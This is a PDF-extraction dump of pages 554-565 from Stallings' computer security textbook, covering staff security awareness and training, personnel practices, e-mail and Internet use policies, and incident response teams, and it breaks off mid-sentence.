       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 555, 'page_label': '554'}, page_content='554  CHAPTER 17 / HUmAN RESOURCES SECURITY\\n2. Users understand the importance of security for the well-being of the organization.\\n3. Because there is a constant barr age of new threats, user support, IT staff \\n enthusiasm, and management buy -in are critical and can be promoted by \\n awareness programs.\\nThe content of an awareness program must be tailored to the needs of the \\norganization and to the target audience, which includes managers, IT profession -\\nals, IT users, and employees with little or no interaction with information systems. \\nNIST SP 800-100 describes the content of awareness programs, in general terms, \\nas follows:\\nAwareness tools are used to promote information security and inform users of \\nthreats and vulnerabilities that impact their division or department and per -\\nsonal work environment by explaining the what but not the how of security, and \\ncommunicating what is and what is not allowed. Awareness not only communi-\\ncates information security policies and procedures that need to be followed, but \\nalso provides the foundation for any sanctions and disciplinary actions imposed \\nfor noncompliance. Awareness is used to explain the rules of behavior for using \\nan agency’s information systems and information and establishes a level of \\nexpectation on the acceptable use of the information and information systems.\\nAn awareness program must continually promote the security message to \\nemployees in a variety of ways. A wide range of activities and materials can be \\nused in such a program. This can include publicity material such as posters, memos, \\nnewsletters, and flyers that detail key aspects of security policies and act to generally \\nraise awareness of the issues from day to day. It can also include various workshops \\nand training sessions for groups of staff, providing information relevant to their \\nneeds. These may often be incorporated into more general training programs on \\norganizational practices and systems. The standards encourage the use of examples \\nof good practice that are related to the organization’s systems and IT usage. The \\nmore relevant and easy to follow the procedures are, the more likely it is that a \\nAwareness Training Education\\nAttribute “What” “How” “Why”\\nLevel Information Knowledge Insight\\nObjective Recognition Skill Understanding\\nTeaching method Media\\n—Videos\\n—Newsletters\\n—Posters, etc.\\nPractical instruction\\n—Lecture\\n—Case study\\nworkshop\\n—Hands-on practice\\nTheoretical instruction\\n—Discussion seminar\\n—Background reading\\nTest measure True/false\\nMultiple choice\\n(identify learning)\\nProblem solving\\n(apply learning)\\nEssay\\n(interpret learning)\\nImpact timeframe Short term Intermediate Long term\\nTable 17.1 Comparative Framework\\nM17_STAL0611_04_GE_C17.indd   554 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 556, 'page_label': '555'}, page_content='17.1 / SECURITY A WARENESS, TRAINING, AND EDUCATION  555\\ngreater level of compliance and hence security will be achieved. Suitable security \\nawareness sessions should be incorporated into the process used to introduce new \\nstaff to the organization and its processes. Security awareness sessions should also be \\nrepeated regularly to help staff members refresh their knowledge and understanding \\nof security issues.\\n[SZUB98] provides a useful list of goals for a security awareness program, as \\nfollows:\\nGoal 1:  Raise staff awareness of information technology security issues in \\ngeneral.\\nGoal 2:  Ensure that staf f are aware of local, state, and federal laws and \\n regulations governing confidentiality and security.\\nGoal 3: Explain organizational security policies and procedures.\\nGoal 4:  Ensure that staf f understand that security is a team effort and that \\neach person has an important role to play in meeting security goals \\nand objectives.\\nGoal 5:  Train staff to meet the specific security responsibilities of their positions.\\nGoal 6: Inform staff that security activities will be monitored.\\nGoal 7: Remind staff that breaches in security carry consequences.\\nGoal 8:  Assure staff that reporting of potential and realized security break -\\ndowns and vulnerabilities is responsible and necessary behavior (and \\nnot trouble-making behavior).\\nGoal 9:  Communicate to staff that the goal of cr eating a trusted system is \\nachievable.\\nTo emphasize the importance of security awareness, an organization should \\nhave a security awareness policy document that is provided to all employees. The \\npolicy should establish three things:\\n1. Participation in an a wareness program is required for every employee. This \\nwill include an orientation program for new employees as well as periodic \\nawareness activities.\\n2. Every one will be given sufficient time to participate in awareness activities.\\n3. Responsibility for managing and conducting awareness activities is clearly \\nspelled out.\\nAn excellent, detailed list of considerations for security awareness is provided \\nin The Standard of Good Practice for Information Security , from the Information \\nSecurity Forum [ISF13]. This material is reproduced in Section 3 of the document \\nSecurityPolicy.pdf, available at https://app.box.com/v/CompSec4e.\\nA key element of current security awareness programs addresses the high levels \\nof social engineering and phishing attacks that we discussed in Chapter 6. The best \\ndefense against such attacks is to enable staff to recognize and resist them by raising \\ntheir awareness of such attacks and the forms they take. A good security aware -\\nness program will include discussion of how such attacks occur, the forms they take, \\nand common characteristics such as pressure for an urgent response to a request \\nfor information or need to install some software. The program will encourage staff \\nM17_STAL0611_04_GE_C17.indd   555 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 557, 'page_label': '556'}, page_content='556  CHAPTER 17 / HUmAN RESOURCES SECURITY\\nto recognize these attacks, and to take the time to seek clarification from trusted \\nsources in the organization as to whether the request is valid or not. Going fur -\\nther, the program may include simulated attacks that provide further information on \\nwhich approaches are more likely to succeed, and hence need greater emphasis in the \\nawareness program, as well as guidance as to which staff could benefit from further \\ninformation and knowledge about these threats.\\nTraining\\nA security training program is designed to teach people the skills to perform their  \\nIT related tasks more securely. Training teaches what people should do and how they \\nshould do it. Depending on the role of the user, training encompasses a spectrum \\nranging from basic computer skills to more advanced specialized skills.\\nFor general users, training focuses on good computer security practices, includ-\\ning the following:\\n• Protecting the physical ar ea and equipment (e.g., locking doors, caring for \\n CD-ROMs, DVDs and portable USB storage devices)\\n• Protecting passwords (if used) or other authentication data or tokens (e.g., \\nnever divulge PINs)\\n• Reporting security violations or incidents (e .g., whom to call if a computer is \\nbehaving unusually, possibly as a result of malware)\\n• Identifying possibly suspicious phishing or spam emails and attachments, know-\\ning how to handle them, and who to contact for assistance\\nProgrammers, developers, and system maintainers require more specialized or \\nadvanced training. This category of employees is critical to establishing and maintain-\\ning computer security. However, it is the rare programmer or developer who under-\\nstands how the software that he or she is building and maintaining can be exploited. \\nTypically, developers do not build security into their applications and may not know \\nhow to do so, and they resist criticism from security analysts. The training objectives \\nfor this group include the following:\\n• Develop a security mindset in the developer.\\n• Show the developer how to build security into development life cycle , using \\nwell-defined checkpoints.\\n• Teach the developer how attackers exploit software and how to resist attack.\\n• Provide analysts with a toolkit of specific attacks and principles with which to \\ninterrogate systems.\\nManagement-level training should teach development managers how to make \\ntrade-offs among risks, costs, and benefits involving security. The manager needs to \\nunderstand the development life cycle and the use of security checkpoints and secu-\\nrity evaluation techniques.\\nExecutive-level training must explain the difference between software security \\nand network security and, in particular, the pervasiveness of software security issues. \\nExecutives need to develop an understanding of security risks and costs. Executives \\nneed training on the development of risk management goals, means of measurement, \\nand the need to lead by example in the area of security awareness.\\nM17_STAL0611_04_GE_C17.indd   556 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 558, 'page_label': '557'}, page_content='17.2 / EmPLOYmENT PRACTICES AND POLICIES  557\\nEducation\\nThe most in-depth program is security education. This is targeted at security pro -\\nfessionals and those whose jobs require expertise in security. Security education is \\nnormally outside the scope of most organization awareness and training programs. \\nIt more properly fits into the category of employee career development programs. \\nOften, this type of education is provided by outside sources such as college or uni -\\nversity courses or specialized training programs.\\n 17.2 EMPLOYMENT PRACTICES AND POLICIES\\nThis section deals with personnel security: hiring, training, monitoring behavior, \\nand handling departure. [SADO03] reports that a large majority of perpetrators \\nof  significant computer crime are individuals who have legitimate access now, or \\nwho have recently had access. Thus, managing personnel with potential access is an \\n essential part of information security.\\nEmployees can be in volved in security violations in one of two ways. Some \\nemployees unwittingly aid in the commission of a security violation by failing to \\nfollow proper procedures, by forgetting security considerations, or by not realizing \\nthat they are creating a vulnerability. Other employees knowingly violate controls or \\nprocedures to cause or aid a security violation.\\nThreats from internal users include the following:\\n• Gaining unauthorized access or enabling others to gain unauthorized access\\n• Altering data\\n• Deleting production and backup data\\n• Crashing systems\\n• Destroying systems\\n• Misusing systems for personal gain or to damage the organization\\n• Holding data hostage\\n• Stealing strategic or customer data for corporate espionage or fraud schemes\\nSecurity in the Hiring Process\\nISO 27002 lists the following security objective of the hiring process: to ensure that \\nemployees, contractors, and third-party users understand their responsibilities and are \\nsuitable for the roles for which they are considered, and to reduce the risk of theft, \\nfraud, or misuse of facilities. Although we are primarily concerned in this section \\nwith  employees, the same considerations apply to contractors and third-party users.\\nBackground checks and screening From a security viewpoint, hiring presents \\nmanagement with significant challenges. [KABA14] points out that growing evidence \\nsuggests that many people inflate their resumes with unfounded claims. Compound-\\ning this problem is the increasing reticence of former employers. Employers may hesi-\\ntate to give bad references for incompetent, underperforming, or unethical employees \\nfor fear of a lawsuit if their comments become known and an employee fails to get a \\nnew job. On the other hand, a favorable reference for an employee who subsequently \\nM17_STAL0611_04_GE_C17.indd   557 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 559, 'page_label': '558'}, page_content='558  CHAPTER 17 / HUmAN RESOURCES SECURITY\\ncauses problems at his or her new job may invite a lawsuit from the new employer. \\nAs a  consequence, a significant number of employers have a corporate policy that \\nforbids discussing a former employee’s performance in any way, positive or negative. \\nThe employer may limit information to the dates of employment and the title of the \\nposition held.\\nDespite these obstacles, employers must make a significant effort to do back -\\nground checks and screening of applicants. Of course, such checks are to confirm that \\nthe prospective employee is competent to perform the intended job and poses no \\nsecurity risk. Additionally, employers need to be cognizant of the concept of “negli-\\ngent hiring” that applies in some jurisdictions. In essence, an employer may be held \\nliable for negligent hiring if an employee causes harm to a third party (individual or \\ncompany) while acting as an employee.\\nGeneral guidelines for checking applicants include the following:\\n• Ask for as much detail as possible about employment and educational history. \\nThe more detail that is available, the more difficult it is for the applicant to lie \\nconsistently.\\n• Investigate the accuracy of the details to the extent reasonable.\\n• Arrange for experienced staf f members to interview candidates and discuss \\ndiscrepancies.\\nFor highly sensitive positions, more intensive investigation is warranted. \\n[SADO03] gives the following examples of what may be warranted in some \\ncircumstances:\\n• Have an investigation agency to do a background check.\\n• Get a criminal record check of the individual.\\n• Check the applicant’s credit record for evidence of large personal debt and the \\ninability to pay it. Discuss problems, if you find them, with the applicant. People \\nwho are in debt should not be denied jobs: if they are, they will never be able \\nto regain solvency. At the same time, employees who are under financial strain \\nmay be more likely to act improperly.\\n• Consider conducting a polygraph examination of the applicant (if legal).  \\nAlthough polygraph exams are not always accurate, they can be helpful if you \\nhave a particularly sensitive position to fill.\\n• Ask the applicant to obtain bonding for his or her position.\\nFor many employees, these steps are excessive. However, the employer should \\nconduct extra checks of any employee who will be in a position of trust or privileged \\naccess—including maintenance and cleaning personnel.\\nemployment  agreements  As part of their contractual obligation,  employees \\nshould agree and sign the terms and conditions of their employment contract, which \\nshould state their and the organization’s responsibilities for information security. \\nThe agreement should include a confidentiality and nondisclosure agreement spell-\\ning out specifically that the organization’s information assets are confidential unless \\nclassified otherwise and that the employee must protect that confidentiality. The \\nagreement should also reference the organization’s security policy and indicate that \\nthe employee has reviewed and agrees to abide by the policy.\\nM17_STAL0611_04_GE_C17.indd   558 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 560, 'page_label': '559'}, page_content='17.2 / EmPLOYmENT PRACTICES AND POLICIES  559\\nDuring Employment\\nISO 27002 lists the following security objective with respect to current employees: to \\nensure that employees, contractors, and third-party users are aware of information \\nsecurity threats and concerns and their responsibilities and liabilities with regard to \\ninformation security and are equipped to support organizational security policy in \\nthe course of their normal work and to reduce the risk of human error.\\nTwo essential elements of personnel security during employment are an ongo-\\ning awareness and training program for all employees and an e-mail and Internet use \\npoliciy, as we discuss in this chapter.\\nIn addition to enforcing the security policy in a fair and consistent manner, \\nthere are certain principles that should be followed for personnel security:\\n• Least privilege:  Give each person the minimum access necessary to do his  \\nor her job. This restricted access is both logical (access to accounts, networks, \\nand  programs) and physical (access to computers, backup tapes, and other \\n peripherals). If every user has accounts on every system and has physical access \\nto everything, then all users are roughly equivalent in their level of threat.\\n• Separation of duties: Carefully separate duties so people involved in checking \\nfor inappropriate use are not also capable of making such inappropriate use. \\nThus, having all the security functions and audit responsibilities reside in the \\nsame person is dangerous. This practice can lead to a case in which the person \\nmay violate security policy and commit prohibited acts, yet in which no other \\nperson sees the audit trail to be alerted to the problem.\\n• Limited reliance on k ey employees:  No one in an organization should be \\n irreplaceable. If your organization depends on the ongoing performance of a \\nkey employee, then your organization is at risk. Organizations cannot help but \\nhave key employees. To be secure, organizations should have written  policies \\nand plans established for unexpected illness or departure. As with systems, \\nredundancy should be built into the employee structure. There should be no \\nsingle employee with unique knowledge or skills.\\nTermination of Employment\\nISO 27002 lists the following security objective with respect to termination of employ-\\nment: to ensure that employees, contractors, and third-party users exit an organization \\nor change employment in an orderly manner, and that the return of all equipment \\nand the removal of all access rights are completed.\\nThe termination process is complex and depends on the nature of the \\n organization, the status of the employee in the organization, and the reason for depar-\\nture. From a security point of view, the following actions are important:\\n• Removing the person’s name from all lists of authorized access.\\n• Explicitly informing guards that the ex-employee is not allowed into the build-\\ning without special authorization by named employees.\\n• Removing all personal access codes.\\n• If appropriate, changing lock combinations, reprogramming access card systems, \\nand replacing physical locks.\\nM17_STAL0611_04_GE_C17.indd   559 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 561, 'page_label': '560'}, page_content='560  CHAPTER 17 / HUmAN RESOURCES SECURITY\\n• Recovering all assets, including employee ID, portable USB storage devices, \\ndocuments, and equipment.\\n• Notifying, by memo or e-mail, appropriate departments.\\n 17.3 E-MAIL AND INTERNET USE POLICIES\\nE-mail and Internet access for most or all employees is common in office environ -\\nments and is typically provided for at least some employees in other environments, \\nsuch as a factory. A growing number of companies incorporate specific e-mail and \\nInternet use policies into the organization’s security policy document. This section \\nexamines some important considerations for these policies.\\nMotivation\\nWidespread use of e-mail and the Internet by employees raises a number of concerns \\nfor employers, including the following:\\n1. Significant employee work time may be consumed in non work-related activi-\\nties, such as surfing the Web, playing games on the Web, shopping on the Web, \\nchatting on the Web, and sending and reading personal e-mail.\\n2. Significant computer and communications resources may be consumed by such \\nnon work-related activity, compromising the mission that the IT resources are \\ndesigned to support.\\n3. Excessive and casual use of the Internet and e-mail unnecessarily increases the \\nrisk of introduction of malicious software into the organization’s IT environment.\\n4. The non work-related employee activity could result in harm to other organi -\\nzations or individuals outside the organization, thus creating a liability for the \\norganization.\\n5. E-mail and the Internet may be used as tools of har assment by one employee \\nagainst another.\\n6. Inappropriate online conduct by an employee ma y damage the reputation of \\nthe organization.\\nPolicy Issues\\nThe development of a comprehensive e-mail and Internet use policy raises a number \\nof policy issues. The following is a suggested set of policies, based on [KING06].\\n• Business use only: Company-provided e-mail and Internet access are to be used \\nby employees only for the purpose of conducting company business.\\n• Policy scope: Policy covers e-mail access; contents of e-mail messages;  Internet \\nand intranet communications;  and records of e-mail, Internet, and intranet \\ncommunications.\\n• Content ownership: Electronic communications, files, and data remain company \\nproperty even when transferred to equipment not owned by the company.\\nM17_STAL0611_04_GE_C17.indd   560 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 562, 'page_label': '561'}, page_content='17.4 / COmPUTER SECURITY INCIDENT RESPONSE TEAmS  561\\n• Privacy: Employees have no expectation of privacy in their use of company-\\nprovided e-mail or Internet access, even if the communication is personal in \\nnature.\\n• Standard of conduct:  Employees are expected to use good judgment and act \\ncourteously and professionally when using company-provided e-mail and \\n Internet access.\\n• Reasonable personal use:  Employees may make reasonable personal use of \\ncompany-provided e-mail and Internet access provided that such use does not \\ninterfere with the employee’s duties, violate company policy, or unduly burden \\ncompany facilities.\\n• Unlawful activity prohibited: Employees may not use company-provided e-mail \\nand Internet access for any illegal purpose.\\n• Security policy:  Employees must follow the company’s security policy when \\nusing e-mail and Internet access.\\n• Company policy:  Employees must follow all other company policies when \\nusing e-mail and Internet access. Company policy prohibits viewing, storing, or \\ndistributing pornography; making or distributing harassing or discriminatory \\ncommunications; and unauthorized disclosure of confidential or proprietary \\ninformation.\\n• Company rights:  The company may access, monitor, intercept, block access, \\ninspect, copy, disclose, use, destroy, recover using computer forensics, and/or \\nretain any communications, files, or other data covered by this policy.  Employees \\nare required to provide passwords upon request.\\n• Disciplinary action: Violation of this policy may result in immediate termina -\\ntion of employment or other discipline deemed appropriate by the company.\\nGuidelines for Developing a Policy\\nA useful document to consult when developing an e-mail and Internet use policy is \\nGuidelines to Assist Agencies in Developing Email and Internet Use Policies, from the \\nOffice of e-Government, the Government of Western Australia, July 2004. A copy is \\navailable at box.com/CompSec4e.\\n 17.4 COMPUTER SECURITY INCIDENT RESPONSE TEAMS\\nThe development of procedures to respond to computer incidents is regarded as an \\nessential control for most organizations. Most organizations will experience some \\nform of security incident sooner rather than later. Typically, most incidents relate to \\nrisks with lesser impacts on the organization, but occasionally a more serious incident \\ncan occur. The incident handling and response procedures need to reflect the range \\nof possible consequences of an incident on the organization and allow for a suitable \\nresponse. By developing suitable procedures in advance, an organization can avoid \\nthe panic that occurs when personnel realize that bad things are happening and are \\nnot sure of the best response.\\nM17_STAL0611_04_GE_C17.indd   561 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 563, 'page_label': '562'}, page_content='562  CHAPTER 17 / HUmAN RESOURCES SECURITY\\nFor large- and medium-sized organizations, a computer security incident \\nresponse team (CSIRT) is responsible for rapidly detecting incidents, minimizing \\nloss and destruction, mitigating the weaknesses that were exploited, and restoring \\ncomputing services.\\nNIST SP 800-61 ( Computer Security Incident Handling Guide , August 2012) \\nlists the following benefits of having an incident response capability:\\n• Responding to incidents systematically so the appropriate steps are taken\\n• Helping personnel to recover quickly and ef ficiently from security incidents, \\nminimizing loss or theft of information and disruption of services\\n• Using information gained during incident handling to better pr epare for han-\\ndling future incidents and to provide stronger protection for systems and data\\n• Dealing properly with legal issues that may arise during incidents\\nConsider the example of a mass e-mail worm infection of an organization. \\nThere have been numerous examples of these in recent years. They typically exploit \\nunpatched vulnerabilities in common desktop applications then spread via e-mail to \\nother addresses known to the infected system. The volume of traffic these can gener-\\nate could be high enough to cripple both intranet and Internet connections. Faced \\nwith such an impact, an obvious response is to disconnect the organization from the \\nwider Internet, and perhaps to shut down the internal e-mail system. This decision \\ncould, however, have a serious impact on the organization’s processes, which must be \\ntraded off against the reduced spread of infection. At the time the incident is detected, \\nthe personnel directly involved may not have the information to make such a critical \\ndecision about the organization’s operations. A good incident response policy should \\nindicate the action to take for an incident of this severity. It should also specify the \\npersonnel who have the responsibility to make decisions concerning such significant \\nactions and detail how they can be quickly contacted to make such decisions.\\nThere is a range of events that can be regarded as a security incident. Indeed, \\nany action that threatens one or more of the classic security services of confidential-\\nity, integrity, availability, accountability, authenticity, and reliability in a system con-\\nstitutes an incident. These include various forms of unauthorized access to a system, \\nand unauthorized modification of information on the system. Unauthorized access \\nto a system by a person includes:\\n• Accessing information that person is not authorized to see\\n• Accessing information and passing it on to another person who is not  authorized \\nto see it\\n• Attempting to circumvent the access mechanisms implemented on a system\\n• Using another person’s user id and password and for any purpose\\n• Attempting to deny use of the system to any other person without  authorization \\nto do so\\nUnauthorized modification of information on a system by a person includes:\\n• Attempting to corrupt information that may be of value to another person\\n• Attempting to modify information and/or resources without authority\\n• Processing information in an unauthorized manner\\nM17_STAL0611_04_GE_C17.indd   562 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 564, 'page_label': '563'}, page_content='17.4 / COmPUTER SECURITY INCIDENT RESPONSE TEAmS  563\\nManaging security incidents involves procedures and controls that address \\n[CARN03]:\\n• Detecting potential security incidents\\n• Sorting, categorizing, and prioritizing incoming incident reports\\n• Identifying and responding to breaches in security\\n• Documenting breaches in security for future reference\\nTable 1 7.2 lists key terms related to computer security incident response.\\nDetecting Incidents\\nSecurity incidents may be detected by users or administration staff who report a \\n system malfunction or anomalous behavior. Staff should be encouraged to make such \\nreports. Staff should also report any suspected weaknesses in systems. The general \\nsecurity training of staff in the organization should include details of whom to contact \\nin such cases.\\nSecurity incidents may also be detected by automated tools, which analyze \\ninformation gathered from the systems and connecting networks. We discussed a \\nrange of such tools in Chapter 8. These tools may report evidence of either a precur-\\nsor to a possible future incident or indication of an actual incident occurring. Tools \\nthat can detect incidents include the following:\\n• System integrity verification tools: Scan critical system files, directories, and ser-\\nvices to ensure that they have not been changed without proper authorization.\\nArtifact\\nAny file or object found on a system that might be involved in probing or attacking systems and networks or \\nthat is being used to defeat security measures. Artifacts can include, but are not limited to, computer viruses, \\nTrojan horse programs, worms, exploit scripts, and toolkits.\\nComputer Security Incident Response Team (CSIRT)\\nA capability set up for the purpose of assisting in responding to computer security-related incidents that \\ninvolve sites within a defined constituency; also called a computer incident response team (CIRT) or a CIRC \\n(Computer Incident Response Center, Computer Incident Response Capability).\\nConstituency\\nThe group of users, sites, networks, or organizations served by the CSIRT.\\nIncident\\nA violation or imminent threat of violation of computer security policies, acceptable use policies, or standard \\nsecurity practices.\\nTriage\\nThe process of receiving, initial sorting, and prioritizing of information to facilitate its appropriate handling.\\nVulnerability\\nA characteristic of a piece of technology which can be exploited to perpetrate a security incident. For example, \\nif a program unintentionally allowed ordinary users to execute arbitrary operating system commands in \\n privileged mode, this “feature” would be a vulnerability.\\nTable 17.2 Security Incident Terminology\\nM17_STAL0611_04_GE_C17.indd   563 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 565, 'page_label': '564'}, page_content='564  CHAPTER 17 / HUmAN RESOURCES SECURITY\\n• Log analysis tools: Analyze the information collected in audit logs using some \\nform of pattern recognition to identify potential security incidents.\\n• Network and host intrusion detection systems (IDS):  Monitor and analyze \\n network and host activity and compare this information with a collection of \\nattack signatures to identify potential security incidents.\\n• Intrusion prevention systems: Augment an intrusion detection system with the \\nability to automatically block detected attacks. Such systems need to be used \\nwith care, because they can cause problems if they respond to a misidentified \\nattack and reduce system functionality when not justified. We discussed such \\n systems in Chapter 9.\\nThe effectiveness of such automated tools depends greatly on the accuracy \\nof their configuration, and the correctness of the patterns and signatures used. The \\ntools need to be updated regularly to reflect new attacks or vulnerabilities. They also \\nneed to distinguish adequately between normal, legitimate behavior and anomalous \\nattack behavior. This is not always easy to achieve and depends on the work patterns \\nof specific organizations and their systems. However, a key advantage of automated \\nsystems that are regularly updated is that they can track changes in known attacks \\nand vulnerabilities. It is often difficult for security administrators to keep pace with \\nthe rapid changes to the security risks to their systems and to respond with patches \\nor other changes needed in a timely manner. The use of automated tools can help \\nreduce the risks to the organization from this delayed response.\\nThe decision to deploy automated tools should result from the organization’s \\nsecurity goals and objectives and specific needs identified in the risk assessment \\nprocess. Deploying these tools usually involves significant resources, both monetary \\nand personnel time. This needs to be justified by the benefits gained in reducing risks.\\nWhether or not automated tools are used, the security administrators need to \\nmonitor reports of vulnerabilities and to respond with changes to their systems if \\nnecessary.\\nTriage Function\\nThe goal of this function is to ensure that all information destined for the incident \\nhandling service is channeled through a single focal point regardless of the method by \\nwhich it arrives (e.g., by e-mail, hotline, helpdesk, and IDS) for appropriate redistribu-\\ntion and handling within the service. This goal is commonly achieved by advertising the \\ntriage function as the single point of contact for the whole incident handling service. The \\ntriage function responds to incoming information in one or more of the following ways:\\n1. The triage function ma y need to request additional information in order to \\ncategorize the incident.\\n2. If the incident relates to a known vulnerability, the triage function notifies the \\nvarious parts of the enterprise or constituency about the vulnerability and shares \\ninformation about how to fix or mitigate the vulnerability.\\n3. The triage function identifies the incident as either new or part of an ongoing \\nincident and passes this information on to the incident handling response func-\\ntion in priority order.\\nM17_STAL0611_04_GE_C17.indd   564 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 566, 'page_label': '565'}, page_content='17.4 / COmPUTER SECURITY INCIDENT RESPONSE TEAmS  565\\nResponding to Incidents\\nOnce a potential incident is detected, there must be documented procedures to \\nrespond to it. [CARN03] lists the following potential response activities:\\n• Taking action to pr otect systems and networks affected or threatened by \\nintruder activity\\n• Providing solutions and mitigation strategies from relevant advisories or alerts\\n• Looking for intruder activity on other parts of the network\\n• Filtering network traffic\\n• Rebuilding systems\\n• Patching or repairing systems\\n• Developing other response or workaround strategies\\nResponse procedures must detail how to identify the cause of the security \\n incident, whether accidental or deliber ate. The procedures must then describe the \\naction taken to recover from the incident in a manner that minimizes the compromise \\nor harm to the organization. It is clearly impossible to detail every possible type of \\nincident. However, the procedures should identify typical categories of such incidents \\nand the approach taken to respond to them. Ideally, these should include descriptions \\nof possible incidents and typical responses. They should also identify the management \\npersonnel responsible for making critical decisions affecting the organization’s systems \\nand how to contact them at any time when an incident is occurring. This is particularly \\nimportant in circumstances such as the mass e-mail worm infection we described, \\nwhen the response involves trading off major loss of functionality against further \\nsignificant systems compromise. Such decisions will clearly affect the organization’s \\noperations and must be made very quickly. NIST SP 800-61 lists the following broad \\ncategories of security incidents that should be addressed in incident response policies:\\n• Denial-of-service attacks that prevent or impair normal use of systems\\n• Malicious code that infects a host\\n• Unauthorized access to a system\\n• Inappropriate usage of a system in violation of acceptable use policies\\n• Multiple-component incidents, which involve two or more of the above catego-\\nries in a single incident\\nIn determining the appropriate responses to an incident, a number of issues \\nshould be considered. These include how critical the system is to the organization’s \\nfunction, and the current and potential technical effect of the incident in terms of \\nhow significantly the system has been compromised.\\nThe response procedures should also identify the circumstances when security \\nbreaches should be reported to third parties such as the police or relevant CERT \\n(computer emergency response team) organization. There is a high degree of variance 